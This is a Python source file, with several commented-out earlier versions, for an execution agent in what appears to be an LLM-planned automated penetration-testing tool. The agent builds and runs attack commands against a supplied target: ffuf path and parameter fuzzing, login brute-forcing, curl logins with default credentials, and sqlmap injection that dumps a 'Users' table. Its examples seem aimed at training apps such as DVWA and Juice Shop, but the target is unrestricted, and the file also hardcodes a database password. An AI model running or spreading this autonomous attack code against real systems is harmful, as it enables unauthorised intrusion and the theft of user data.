# # import datetime
# # import json
# # import os
# # import re
# # from unittest import result
# # from neo4j import AsyncGraphDatabase


# # class ExecutionAgent:

# #     def __init__(self,
# #                 orchestrator,
# #                 uri: str = "neo4j://127.0.0.1:7687",
# #                 user: str = "neo4j",
# #                 password: str = "12341234",
# #                 ):
# #         self.orchestrator = orchestrator
# #         self.driver = AsyncGraphDatabase.driver(uri, auth=(user, password))

# #     async def run(self, state):

# #         print("\n[ExecutionAgent] Running...")

# #         plan = state.get("attack_plan")
# #         if not plan or "steps" not in plan:
# #             print("\n[ExecutionAgent] Invalid attack_plan format")
# #             return {**state, "done": True, "error": "Invalid attack_plan"}

# #         if "attack_plan" not in state:
# #             print("\n[ExecutionAgent] Missing attack_plan")
# #             return {**state, "done": True, "error": "Missing attack_plan"}

# #         print("\n[ExecutionAgent] Attack plan:", state["attack_plan"])
        
# #         steps = plan.get("steps", [])

# #         idx = state.get("current_step", 0)

# #         if idx >= len(steps):
# #             return {**state, "done": True}

# #         step = steps[idx]
# #         print("\n[ExecutionAgent] Current step:", step, '\n')

# #         command = self.build_command(step, state["target"])
# #         print("\n[ExecutionAgent] Built command:", command, '\n')

# #         if not command:
# #             return {**state, "done": True, "error": f"Unsupported step: {step}"}

# #         result = await self.orchestrator.execute_command({
# #             **state,
# #             "command": command
# #         })

# #         technique = step.get("technique")
# #         target = state["target"]

# #         output_file = None

# #         raw_output = result.get("docker_result", "")
# #         parsed_output = None

# #         if technique == "directorydiscovery":
# #             parsed_output = self.parse_ffuf_terminal_output(raw_output)
# #             await self._store_directorydiscovery(target, parsed_output)

# #             output_file = f"docker/kali-home/output/ffuf_{target}.json"

# #         elif technique == "sqli":
# #             output_file = f"docker/kali-home/output/sqlmap"

# #         # Try reading output
# #         parsed_output = None

# #         if output_file and os.path.exists(output_file):
# #             try:
# #                 print("Reading output from:", output_file)
# #                 if output_file.endswith(".json"):
# #                     print("writing in history")
# #                     with open(output_file) as f:
# #                         parsed_output = json.load(f)
# #                 else:
# #                     parsed_output = "sqlmap results stored"

# #                 os.makedirs("history", exist_ok=True)
# #                 timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
# #                 history_file = f"history/{technique}_{target}_{timestamp}.json"

# #                 with open(history_file, "w") as f:
# #                     json.dump({
# #                         "timestamp": timestamp,
# #                         "technique": technique,
# #                         "target": target,
# #                         "command": command,
# #                         "result": result.get("docker_result")
# #                     }, f, indent=2)

# #                 print(f"[ExecutionAgent] History written to: {history_file}")
# #             except Exception as e:
# #                 parsed_output = f"parse_error: {str(e)}"

# #         # return {
# #         #     **result,
# #         #     "step_result": result.get("docker_result"),
# #         #     "parsed_output": parsed_output,
# #         #     "current_step": idx + 1
# #         # }

# #         # Near the end of ExecutionAgent.run(), before returning:
# #         return {
# #             **result,
# #             "step_result": result.get("docker_result"),
# #             "parsed_output": parsed_output,
# #             "current_step": idx + 1,
# #             # "step_completed": True  # Add this
# #         }

# #     def build_command(self, step, target):

# #         if not isinstance(step, dict):
# #             print(f"[ExecutionAgent] ERROR: step is {type(step)}, expected dict: {step}")
# #             return None
    
# #         technique = step.get("technique")
    
# #         if not technique:
# #             print(f"[ExecutionAgent] ERROR: step missing 'technique' field: {step}")
# #             return None


# #         # technique = step.get("technique")

# #         if technique == "directorydiscovery":
# #             return [
# #                 "ffuf",
# #                 "-u", f"http://{target}/FUZZ",
# #                 "-w", "/usr/share/wordlists/dirb/common.txt",
# #                 "-o", f"/root/output/ffuf_{target}.json",
# #                 "-of", "json"
# #             ]

# #         if technique == "sqli":
# #             return [
# #                 "sqlmap",
# #                 "-u", f"http://{target}/login.php",
# #                 "--batch",
# #                 "--output-dir=/root/output/sqlmap"
# #             ]

# #         return None
    
# #     def parse_ffuf_terminal_output(self, raw: str) -> list:
# #         ansi_escape = re.compile(r'\r?\x1b\[[0-9;]*[A-Za-z]|\x1b\[[0-9]*K')
# #         clean = ansi_escape.sub('', raw)

# #         results = []
# #         pattern = re.compile(
# #             r'(\S+)?\s+\[Status:\s*(\d+),\s*Size:\s*(\d+),\s*Words:\s*(\d+),\s*Lines:\s*(\d+),\s*Duration:\s*(\S+)\]'
# #         )

# #         for match in pattern.finditer(clean):
# #             path, status, size, words, lines, duration = match.groups()
# #             results.append({
# #                 "path": path.strip() if path else "/",
# #                 "status": int(status),
# #                 "size": int(size),
# #                 "words": int(words),
# #                 "lines": int(lines),
# #                 "duration": duration
# #             })

# #         return results

# #     def parse_curl_output(self, raw: str, path: str) -> dict:
# #         clean = re.sub(r'\x1b\[[0-9;]*[A-Za-z]', '', raw).strip()
# #         return {
# #             "path": path,
# #             "content": clean,
# #             "length": len(clean)
# #         }

# #     # -----------------------------
# #     # Neo4j Store Methods
# #     # -----------------------------

# #     async def _store_directorydiscovery(self, target: str, results: list):
# #         """
# #         Graph: (Host)-[:HAS_PATH]->(DiscoveredPath)
# #         """
# #         query = """
# #         MERGE (h:Host {ip: $target})
# #         WITH h
# #         UNWIND $results AS r
# #         MERGE (p:DiscoveredPath {path: r.path, host: $target})
# #         SET p.status   = r.status,
# #             p.size     = r.size,
# #             p.words    = r.words,
# #             p.lines    = r.lines,
# #             p.duration = r.duration
# #         MERGE (h)-[:HAS_PATH]->(p)
# #         """
# #         await self._run_query(query, {"target": target, "results": results})
# #         print(f"[Neo4j] Stored {len(results)} discovered paths for {target}")

# #     async def _run_query(self, query: str, params: dict):
# #         try:
# #             async with self.driver.session() as session:
# #                 await session.run(query, **params)
# #         except Exception as e:
# #             print(f"[Neo4j] Query failed: {e}")

    
# #     async def close(self):
# #         await self.driver.close()

# import datetime
# import json
# import os
# import re
# from typing import List, Dict, Any, Optional
# from neo4j import AsyncGraphDatabase

# class ExecutionAgent:
#     def __init__(self,
#                  orchestrator,
#                  uri: str = "neo4j://127.0.0.1:7687",
#                  user: str = "neo4j",
#                  password: str = "12341234"):
#         self.orchestrator = orchestrator
#         self.driver = AsyncGraphDatabase.driver(uri, auth=(user, password))

#     async def run(self, state: Dict[str, Any]) -> Dict[str, Any]:
#         print("\n[ExecutionAgent] Running...")

#         plan = state.get("attack_plan")
#         if not plan or "steps" not in plan:
#             print("[ExecutionAgent] Invalid attack_plan format")
#             return {**state, "done": True, "error": "Invalid attack_plan"}

#         steps = plan.get("steps", [])
#         idx = state.get("current_step", 0)

#         if idx >= len(steps):
#             return {**state, "done": True}

#         step = steps[idx]
#         print(f"[ExecutionAgent] Current step: {step}")

#         # Get previously discovered paths from Neo4j
#         discovered_paths = await self._get_discovered_paths(state["target"])

#         # Build command dynamically
#         command = await self.build_command(step, state["target"], discovered_paths)
#         if not command:
#             print(f"[ExecutionAgent] Skipping unsupported step: {step.get('technique')}")
#             return {
#                 **state,
#                 "current_step": idx + 1,
#                 "step_result": f"Skipped: {step.get('technique')} not implemented"
#             }

#         print(f"[ExecutionAgent] Built command: {command}")

#         result = await self.orchestrator.execute_command({
#             **state,
#             "command": command
#         })

#         technique = step.get("technique")
#         target = state["target"]
#         raw_output = result.get("docker_result", "")
#         parsed_output = None

#         if technique == "directorydiscovery":
#             parsed_output = self.parse_ffuf_terminal_output(raw_output)
#             await self._store_directorydiscovery(target, parsed_output)

#         # Write history
#         os.makedirs("history", exist_ok=True)
#         timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
#         history_file = f"history/{technique}_{target}_{timestamp}.json"
#         with open(history_file, "w") as f:
#             json.dump({
#                 "timestamp": timestamp,
#                 "technique": technique,
#                 "target": target,
#                 "command": command,
#                 "result": raw_output
#             }, f, indent=2)

#         return {
#             **result,
#             "step_result": raw_output,
#             "parsed_output": parsed_output,
#             "current_step": idx + 1,
#             "done": False
#         }

#     async def build_command(self, step: Dict, target: str, discovered_paths: List[str]) -> Optional[List[str]]:
#         if not isinstance(step, dict):
#             print(f"[ExecutionAgent] ERROR: step is {type(step)}")
#             return None

#         technique = step.get("technique")
#         if not technique:
#             print("[ExecutionAgent] ERROR: step missing 'technique'")
#             return None

#         # Helper to ensure URL has correct slashes
#         def _url_join(base: str, path: str) -> str:
#             base = base.rstrip('/')
#             path = path.lstrip('/')
#             return f"{base}/{path}"

#         base_url = f"http://{target}"

#         # ---------- directorydiscovery ----------
#         if technique == "directorydiscovery":
#             if discovered_paths:
#                 # Pick first non-binary, non-hidden path to fuzz deeper
#                 interesting = [p for p in discovered_paths 
#                               if not p.endswith(('.ico', '.txt', '.jpg', '.png')) 
#                               and not p.startswith('.')]
#                 if interesting:
#                     subpath = interesting[0].lstrip('/')
#                     fuzz_url = _url_join(base_url, f"{subpath}/FUZZ")
#                     return [
#                         "ffuf", "-u", fuzz_url,
#                         "-w", "/usr/share/wordlists/dirb/common.txt",
#                         "-o", f"/root/output/ffuf_{target}_deep.json",
#                         "-of", "json"
#                     ]
#             # Default root fuzzing
#             return [
#                 "ffuf", "-u", _url_join(base_url, "FUZZ"),
#                 "-w", "/usr/share/wordlists/dirb/common.txt",
#                 "-o", f"/root/output/ffuf_{target}.json",
#                 "-of", "json"
#             ]

#         # ---------- sqli ----------
#         if technique == "sqli":
#             # Try to find PHP pages from discovered paths
#             php_pages = [p for p in (discovered_paths or []) if '.php' in p]
#             if php_pages:
#                 # Ensure leading slash
#                 page = php_pages[0].lstrip('/')
#                 target_url = _url_join(base_url, page)
#                 return [
#                     "sqlmap", "-u", target_url,
#                     "--batch", "--forms", "--level=2",
#                     "--output-dir=/root/output/sqlmap"
#                 ]
#             # Default fallback
#             target_url = _url_join(base_url, "login.php")
#             return [
#                 "sqlmap", "-u", target_url,
#                 "--batch", "--output-dir=/root/output/sqlmap"
#             ]

#         # ---------- fuzzing (parameter fuzzing) ----------
#         if technique == "fuzzing":
#             php_pages = [p for p in (discovered_paths or []) if '.php' in p]
#             if php_pages:
#                 page = php_pages[0].lstrip('/')
#                 target_url = _url_join(base_url, page)
#                 return [
#                     "ffuf", "-u", f"{target_url}?FUZZ=test",
#                     "-w", "/usr/share/wordlists/parameter.txt",
#                     "-o", f"/root/output/ffuf_params_{target}.json",
#                     "-of", "json"
#                 ]
#             return None

#         # ---------- bruteforce ----------
#         if technique == "bruteforce":
#             login_pages = [p for p in (discovered_paths or []) if 'login' in p]
#             if login_pages:
#                 page = login_pages[0].lstrip('/')
#                 target_url = _url_join(base_url, page)
#                 return [
#                     "ffuf", "-u", target_url,
#                     "-X", "POST",
#                     "-d", "username=FUZZ&password=admin",
#                     "-w", "/usr/share/wordlists/common_users.txt",
#                     "-fc", "401,403",
#                     "-o", f"/root/output/ffuf_bruteforce.json",
#                     "-of", "json"
#                 ]
#             return None

#         return None

#     async def _get_discovered_paths(self, target: str) -> List[str]:
#         query = """
#         MATCH (h:Host {ip: $target})-[:HAS_PATH]->(p:DiscoveredPath)
#         RETURN DISTINCT p.path AS path
#         """
#         async with self.driver.session() as session:
#             result = await session.run(query, {"target": target})
#             records = await result.values()
#             return [record[0] for record in records]

#     def parse_ffuf_terminal_output(self, raw: str) -> list:
#         ansi_escape = re.compile(r'\r?\x1b\[[0-9;]*[A-Za-z]|\x1b\[[0-9]*K')
#         clean = ansi_escape.sub('', raw)
#         results = []
#         pattern = re.compile(
#             r'(\S+)?\s+\[Status:\s*(\d+),\s*Size:\s*(\d+),\s*Words:\s*(\d+),\s*Lines:\s*(\d+),\s*Duration:\s*(\S+)\]'
#         )
#         for match in pattern.finditer(clean):
#             path, status, size, words, lines, duration = match.groups()
#             results.append({
#                 "path": path.strip() if path else "/",
#                 "status": int(status),
#                 "size": int(size),
#                 "words": int(words),
#                 "lines": int(lines),
#                 "duration": duration
#             })
#         return results

#     async def _store_directorydiscovery(self, target: str, results: list):
#         query = """
#         MERGE (h:Host {ip: $target})
#         WITH h
#         UNWIND $results AS r
#         MERGE (p:DiscoveredPath {path: r.path, host: $target})
#         SET p.status = r.status, p.size = r.size, p.words = r.words,
#             p.lines = r.lines, p.duration = r.duration
#         MERGE (h)-[:HAS_PATH]->(p)
#         """
#         await self._run_query(query, {"target": target, "results": results})
#         print(f"[Neo4j] Stored {len(results)} discovered paths for {target}")

#     async def _run_query(self, query: str, params: dict):
#         try:
#             async with self.driver.session() as session:
#                 await session.run(query, **params)
#         except Exception as e:
#             print(f"[Neo4j] Query failed: {e}")

#     async def close(self):
#         await self.driver.close()



# import datetime
# import json
# import os
# import re
# from typing import List, Dict, Any, Optional
# from neo4j import AsyncGraphDatabase

# class ExecutionAgent:
#     def __init__(self,
#                  orchestrator,
#                  uri: str = "neo4j://127.0.0.1:7687",
#                  user: str = "neo4j",
#                  password: str = "12341234"):
#         self.orchestrator = orchestrator
#         self.driver = AsyncGraphDatabase.driver(uri, auth=(user, password))

#     async def run(self, state: Dict[str, Any]) -> Dict[str, Any]:
#         print("\n[ExecutionAgent] Running...")

#         plan = state.get("attack_plan")
#         if not plan or "steps" not in plan:
#             print("[ExecutionAgent] Invalid attack_plan format")
#             return {**state, "done": True, "error": "Invalid attack_plan"}

#         steps = plan.get("steps", [])
#         idx = state.get("current_step", 0)

#         if idx >= len(steps):
#             return {**state, "done": True}

#         step = steps[idx]
#         print(f"[ExecutionAgent] Current step: {step}")

#         discovered_paths = await self._get_discovered_paths(state["target"])
#         session_cookie = state.get("session_cookie")

#         command = await self.build_command(step, state["target"], discovered_paths, session_cookie)
#         if not command:
#             print(f"[ExecutionAgent] Skipping unsupported step: {step.get('technique')}")
#             return {
#                 **state,
#                 "current_step": idx + 1,
#                 "step_result": f"Skipped: {step.get('technique')} not implemented"
#             }

#         print(f"[ExecutionAgent] Built command: {command}")

#         result = await self.orchestrator.execute_command({
#             **state,
#             "command": command
#         })

#         technique = step.get("technique")
#         target = state["target"]
#         raw_output = result.get("docker_result", "")
#         parsed_output = None

#         if technique == "directorydiscovery":
#             parsed_output = self.parse_ffuf_terminal_output(raw_output)
#             await self._store_directorydiscovery(target, parsed_output)

#         # Capture session cookie from login response
#         if technique == "authenticate" or (technique == "sqli" and not session_cookie):
#             cookie = self._extract_phpsessid(raw_output)
#             if cookie:
#                 state["session_cookie"] = cookie
#                 print(f"[ExecutionAgent] Stored session cookie: {cookie}")

#         # Write history
#         os.makedirs("history", exist_ok=True)
#         timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
#         history_file = f"history/{technique}_{target}_{timestamp}.json"
#         with open(history_file, "w") as f:
#             json.dump({
#                 "timestamp": timestamp,
#                 "technique": technique,
#                 "target": target,
#                 "command": command,
#                 "result": raw_output
#             }, f, indent=2)

#         return {
#             **result,
#             "step_result": raw_output,
#             "parsed_output": parsed_output,
#             "current_step": idx + 1,
#             "session_cookie": state.get("session_cookie"),
#             "done": False
#         }

#     async def build_command(self, step: Dict, target: str,
#                             discovered_paths: List[str],
#                             session_cookie: Optional[str] = None) -> Optional[List[str]]:
#         if not isinstance(step, dict):
#             print(f"[ExecutionAgent] ERROR: step is {type(step)}")
#             return None

#         technique = step.get("technique")
#         if not technique:
#             print("[ExecutionAgent] ERROR: step missing 'technique'")
#             return None

#         def _url_join(base: str, path: str) -> str:
#             base = base.rstrip('/')
#             path = path.lstrip('/')
#             return f"{base}/{path}"

#         base_url = f"http://{target}"

#         # ---------- directorydiscovery ----------
#         if technique == "directorydiscovery":
#             if discovered_paths:
#                 interesting = [p for p in discovered_paths
#                                if not p.endswith(('.ico', '.txt', '.jpg', '.png'))
#                                and not p.startswith('.') and p not in ('/', '')]
#                 if interesting:
#                     subpath = interesting[0].lstrip('/')
#                     fuzz_url = _url_join(base_url, f"{subpath}/FUZZ")
#                     return [
#                         "ffuf", "-u", fuzz_url,
#                         "-w", "/usr/share/wordlists/dirb/common.txt",
#                         "-o", f"/root/output/ffuf_{target}_deep.json",
#                         "-of", "json"
#                     ]
#             # Default root fuzzing
#             return [
#                 "ffuf", "-u", _url_join(base_url, "FUZZ"),
#                 "-w", "/usr/share/wordlists/dirb/common.txt",
#                 "-o", f"/root/output/ffuf_{target}.json",
#                 "-of", "json"
#             ]

#         # ---------- authenticate (explicit step) ----------
#         if technique == "authenticate":
#             login_url = _url_join(base_url, "login.php")
#             return [
#                 "curl", "-s", "-c", "/tmp/cookies.txt",
#                 "-d", "username=admin&password=password",
#                 "-L", login_url
#             ]

#         # ---------- sqli ----------
#         if technique == "sqli":
#             # If no session cookie, try to authenticate first
#             if not session_cookie:
#                 print("[ExecutionAgent] No session cookie, authenticating...")
#                 auth_cmd = await self.build_command(
#                     {"technique": "authenticate", "params": {}}, target, [], None
#                 )
#                 if auth_cmd:
#                     auth_result = await self.orchestrator.execute_command({"command": auth_cmd})
#                     cookie = self._extract_phpsessid(auth_result.get("docker_result", ""))
#                     if cookie:
#                         session_cookie = cookie
#                         print(f"[ExecutionAgent] Obtained cookie: {session_cookie}")
#                     else:
#                         print("[ExecutionAgent] Authentication failed, proceeding without cookie")

#             # Prefer the known SQLi endpoint after authentication
#             sqli_endpoint = "/vulnerabilities/sqli/?id=1"
#             test_url = _url_join(base_url, sqli_endpoint)
#             cmd = [
#                 "sqlmap", "-u", test_url,
#                 "--batch", "--level=2", "--risk=2",
#                 "--output-dir=/root/output/sqlmap"
#             ]
#             if session_cookie:
#                 cmd += ["--cookie", f"PHPSESSID={session_cookie}"]
#             return cmd

#     #     if technique == "sqli":
#     # # Authenticate if no cookie
#     #         if not session_cookie:
#     #             print("[ExecutionAgent] Authenticating...")
#     #             auth_cmd = ["curl", "-s", "-c", "/tmp/cookies.txt",
#     #                     "-d", "username=admin&password=password",
#     #                     "-L", "http://dvwa/login.php"]
#     #             await self.orchestrator.execute_command({"command": auth_cmd})
#     #     # Read cookie
#     #             cookie_res = await self.orchestrator.execute_command({"command": ["cat", "/tmp/cookies.txt"]})
#     #             cookie_match = re.search(r"PHPSESSID\s+(\S+)", cookie_res.get("docker_result", ""))
#     #             if cookie_match:
#     #                 session_cookie = cookie_match.group(1)
#     #         # Set security to low
#     #                 await self.orchestrator.execute_command({
#     #                     "command": ["curl", "-s", "-b", f"PHPSESSID={session_cookie}",
#     #                         "http://dvwa/security.php", "-d", "security=low&seclev_submit=Submit"]
#     #                 })
#     #                 print(f"[ExecutionAgent] Authenticated, security set to low")

#     #         if session_cookie:
#     #             target_url = "http://dvwa/vulnerabilities/sqli/?id=1"
#     #             return [
#     #                 "sqlmap", "-u", target_url,
#     #                 "--cookie", f"PHPSESSID={session_cookie}",
#     #                 "--batch", "--level=2", "--risk=2",
#     #                 "--output-dir=/root/output/sqlmap"
#     #             ]
#     #         else:
#     #             return None
            

#         # ---------- fuzzing ----------
#         if technique == "fuzzing":
#             # Use simple built-in wordlist if seclists not present
#             wordlist = "/usr/share/wordlists/dirb/common.txt"  # fallback
#             # Optionally try to create a parameter wordlist on the fly
#             php_pages = [p for p in (discovered_paths or []) if '.php' in p]
#             if php_pages:
#                 page = php_pages[0].lstrip('/')
#                 target_url = _url_join(base_url, page)
#                 return [
#                     "ffuf", "-u", f"{target_url}?FUZZ=test",
#                     "-w", wordlist,
#                     "-o", f"/root/output/ffuf_params_{target}.json",
#                     "-of", "json"
#                 ]
#             return None

#         # ---------- bruteforce ----------
#         if technique == "bruteforce":
#             login_pages = [p for p in (discovered_paths or []) if 'login' in p]
#             if login_pages:
#                 page = login_pages[0].lstrip('/')
#                 target_url = _url_join(base_url, page)
#                 return [
#                     "ffuf", "-u", target_url,
#                     "-X", "POST",
#                     "-d", "username=FUZZ&password=admin",
#                     "-w", "/usr/share/wordlists/dirb/common.txt",
#                     "-fc", "401,403",
#                     "-o", f"/root/output/ffuf_bruteforce.json",
#                     "-of", "json"
#                 ]
#             return None

#         return None

#     def _extract_phpsessid(self, output: str) -> Optional[str]:
#         # Try cookie file content
#         match = re.search(r"PHPSESSID\s+(\S+)", output)
#         if not match:
#             # Try Set-Cookie header
#             match = re.search(r"Set-Cookie:\s*PHPSESSID=([^;]+)", output)
#         if match:
#             return match.group(1)
#         return None


#     # async def _extract_phpsessid(self, output: str) -> Optional[str]:
#     # # Try to read the cookie file written by curl -c
#     #     try:
#     #         result = await self.orchestrator.execute_command({
#     #             "command": ["cat", "/tmp/cookies.txt"]
#     #         })
#     #         cookie_content = result.get("docker_result", "")
#     #         match = re.search(r"PHPSESSID\s+(\S+)", cookie_content)
#     #         if match:
#     #             return match.group(1)
#     #     except Exception as e:
#     #         print(f"Cookie read error: {e}")
#     #     return None

#     async def _get_discovered_paths(self, target: str) -> List[str]:
#         query = """
#         MATCH (h:Host {ip: $target})-[:HAS_PATH]->(p:DiscoveredPath)
#         RETURN DISTINCT p.path AS path
#         """
#         async with self.driver.session() as session:
#             result = await session.run(query, {"target": target})
#             records = await result.values()
#             return [record[0] for record in records]

#     def parse_ffuf_terminal_output(self, raw: str) -> list:
#         ansi_escape = re.compile(r'\r?\x1b\[[0-9;]*[A-Za-z]|\x1b\[[0-9]*K')
#         clean = ansi_escape.sub('', raw)
#         results = []
#         pattern = re.compile(
#             r'(\S+)?\s+\[Status:\s*(\d+),\s*Size:\s*(\d+),\s*Words:\s*(\d+),\s*Lines:\s*(\d+),\s*Duration:\s*(\S+)\]'
#         )
#         for match in pattern.finditer(clean):
#             path, status, size, words, lines, duration = match.groups()
#             results.append({
#                 "path": path.strip() if path else "/",
#                 "status": int(status),
#                 "size": int(size),
#                 "words": int(words),
#                 "lines": int(lines),
#                 "duration": duration
#             })
#         return results

#     async def _store_directorydiscovery(self, target: str, results: list):
#         query = """
#         MERGE (h:Host {ip: $target})
#         WITH h
#         UNWIND $results AS r
#         MERGE (p:DiscoveredPath {path: r.path, host: $target})
#         SET p.status = r.status, p.size = r.size, p.words = r.words,
#             p.lines = r.lines, p.duration = r.duration
#         MERGE (h)-[:HAS_PATH]->(p)
#         """
#         await self._run_query(query, {"target": target, "results": results})
#         print(f"[Neo4j] Stored {len(results)} discovered paths for {target}")

#     async def _run_query(self, query: str, params: dict):
#         try:
#             async with self.driver.session() as session:
#                 await session.run(query, **params)
#         except Exception as e:
#             print(f"[Neo4j] Query failed: {e}")

#     async def close(self):
#         await self.driver.close()



import datetime, json, os, re
from typing import List, Dict, Any, Optional, Literal
from neo4j import AsyncGraphDatabase
from pydantic import BaseModel, Field, field_validator, ValidationError

# -----------------------------------------------------------------------
# Step validator (same as in planning)
# -----------------------------------------------------------------------
class Step(BaseModel):
    technique: Literal["spidering", "sqli"]
    description: str
    params: Dict = Field(default_factory=dict)

    @field_validator("technique")
    @classmethod
    def validate_technique(cls, v):
        v = v.lower().strip()
        if v in ["sql injection", "sqli"]:
            return "sqli"
        if v not in {"spidering", "sqli"}:
            raise ValueError(f"Invalid technique: {v}")
        return v

# -----------------------------------------------------------------------
# Execution Agent
# -----------------------------------------------------------------------
class ExecutionAgent:
    def __init__(self, orchestrator,
                 uri: str = "neo4j://127.0.0.1:7687",
                 user: str = "neo4j",
                 password: str = "12341234"):
        self.orchestrator = orchestrator
        self.driver = AsyncGraphDatabase.driver(uri, auth=(user, password))
        self.last_state = {}                    # cache to detect web port

    async def run(self, state: Dict[str, Any]) -> Dict[str, Any]:
        self.last_state = state
        print("\n[ExecutionAgent] Running (spidering / sqli only)...")

        plan = state.get("attack_plan")
        if not plan or "steps" not in plan or not plan["steps"]:
            print("[ExecutionAgent] No valid steps – nothing to do")
            return {**state, "done": True}

        steps = plan["steps"]
        idx = state.get("current_step", 0)

        # Skip invalid steps (e.g., LLM typos)
        while idx < len(steps):
            raw_step = steps[idx]
            try:
                step = Step.model_validate(raw_step)
                break
            except ValidationError:
                print(f"[ExecutionAgent] Skipping invalid step: {raw_step}")
                idx += 1
        else:
            return {**state, "done": True}

        print(f"[ExecutionAgent] Executing step {idx+1}/{len(steps)}: {step}")

        target = state["target"]
        discovered_paths = await self._get_discovered_paths(target)
        session_cookie = state.get("session_cookie")

        command = await self.build_command(step, target, discovered_paths, session_cookie)
        if not command:
            print(f"[ExecutionAgent] Cannot build command for {step.technique}, moving on")
            return {**state, "current_step": idx + 1}

        print(f"[ExecutionAgent] Command: {command}")

        result = await self.orchestrator.execute_command({
            **state,
            "command": command
        })

        technique = step.technique
        raw_output = result.get("docker_result", "")
        parsed = None

        if technique == "spidering":
            parsed = self.parse_gospider_output(raw_output)
            if parsed:
                await self._store_spidered_paths(target, parsed)
        elif technique == "sqli":
            parsed = self.parse_sqlmap_output(raw_output)
            if parsed:
                await self._store_sqli_findings(target, parsed)

        # Save history
        os.makedirs("history", exist_ok=True)
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        with open(f"history/{technique}_{target}_{ts}.json", "w") as f:
            json.dump({"technique": technique, "target": target, "command": command, "result": raw_output}, f)

        return {
            **result,
            "step_result": raw_output,
            "parsed_output": parsed,
            "current_step": idx + 1,
            "session_cookie": session_cookie,
            "done": False
        }

    # ----------------------------------------------------------------
    # Port‑aware base URL
    # ----------------------------------------------------------------
    def _get_base_url(self, target: str) -> str:
        """Return http://target:port using the first web port from services."""
        if ':' in target:
            return f"http://{target}"
        services = self.last_state.get('services', [])
        for svc in services:
            for port in svc.get('ports', []):
                p = port.get('port')
                name = port.get('service', '').lower()
                if p and (name in ['http','https','ppp','unknown'] or p == 3000):
                    return f"http://{target}:{p}"
        return f"http://{target}:3000"   # fallback

    # ----------------------------------------------------------------
    # Command builders
    # ----------------------------------------------------------------
    async def build_command(self, step: Step, target: str,
                            discovered_paths: List[str],
                            session_cookie: Optional[str] = None) -> Optional[list]:
        technique = step.technique
        base = self._get_base_url(target)   # now with correct port (3000)

        if technique == "spidering":
            out = f"/root/output/gospider_{target.replace('.','_')}.json"
            return ["bash", "-c", f"gospider -s {base} -o json -d 2 -t 10 -c 10 > {out}"]

        # if technique == "sqli":
        #     candidate = await self._get_best_sqli_candidate(target)
        #     if not candidate:
        #         candidate = f"{base}/rest/products/search?q=test"
        #     cmd = ["sqlmap", "-u", candidate, "--batch", "--level=3", "--risk=2",
        #            "--output-dir=/root/output/sqlmap", "--random-agent"]
        #     if session_cookie:
        #         cmd += ["--cookie", f"PHPSESSID={session_cookie}"]
        #     return cmd
        if technique == "sqli":
            candidate = await self._get_best_sqli_candidate(target)
            if not candidate:
                candidate = f"{base}/rest/products/search?q=test"
            cmd = [
                "sqlmap", "-u", candidate,
                "--batch",
                "--dbms=sqlite",          # skip other DBMS checks
                "-T", "Users",            # target table
                "--dump",                 # dump all rows
                "--threads", "10",        # speed up
                "--output-dir=/root/output/sqlmap",
                "--random-agent"
            ]
            if session_cookie:
                cmd += ["--cookie", f"PHPSESSID={session_cookie}"]
            return cmd

        return None

    async def _get_best_sqli_candidate(self, target: str) -> Optional[str]:
        query = """
        MATCH (h:Host {ip: $target})-[:HAS_PATH]->(p:DiscoveredPath)
        WHERE p.path =~ '.*\\?.*'
        RETURN p.path AS path
        ORDER BY CASE
            WHEN p.path CONTAINS 'search' THEN 0
            WHEN p.path CONTAINS 'product' THEN 1
            WHEN p.path CONTAINS 'user' THEN 2
            ELSE 3
        END LIMIT 1
        """
        async with self.driver.session() as session:
            result = await session.run(query, target=target)
            record = await result.single()
            if record:
                return f"http://{target}:3000/{record['path'].lstrip('/')}"
        return None

    # ----------------------------------------------------------------
    # Parsers
    # ----------------------------------------------------------------
    def parse_gospider_output(self, raw: str) -> list:
        try:
            data = json.loads(raw)
            return [{"path": e["url"]} for e in data if "url" in e]
        except:
            return []

    def parse_sqlmap_output(self, raw: str) -> list:
        findings = []
        if "is vulnerable" in raw.lower():
            for line in raw.splitlines():
                if "Parameter:" in line:
                    param = line.split("Parameter:")[1].strip()
                    findings.append({"parameter": param})
        return findings

    # ----------------------------------------------------------------
    # Neo4j storage
    # ----------------------------------------------------------------
    async def _store_spidered_paths(self, target, results):
        q = """
        MERGE (h:Host {ip: $target})
        WITH h UNWIND $results AS r
        MERGE (p:DiscoveredPath {path: r.path, host: $target})
        SET p.source = 'gospider'
        MERGE (h)-[:HAS_PATH]->(p)
        """
        await self._run_query(q, {"target": target, "results": results})

    async def _store_sqli_findings(self, target, findings):
        q = """
        MERGE (h:Host {ip: $target})
        WITH h UNWIND $findings AS f
        MERGE (v:SQLiVulnerability {parameter: f.parameter, host: $target})
        MERGE (h)-[:HAS_VULNERABILITY]->(v)
        """
        await self._run_query(q, {"target": target, "findings": findings})

    async def _get_discovered_paths(self, target: str) -> List[str]:
        q = "MATCH (h:Host {ip: $target})-[:HAS_PATH]->(p) RETURN DISTINCT p.path AS path"
        async with self.driver.session() as session:
            res = await session.run(q, target=target)
            records = await res.values()
            return [r[0] for r in records]

    async def _run_query(self, query, params):
        try:
            async with self.driver.session() as session:
                await session.run(query, **params)
        except Exception as e:
            print(f"[Neo4j] {e}")

    async def close(self):
        await self.driver.close()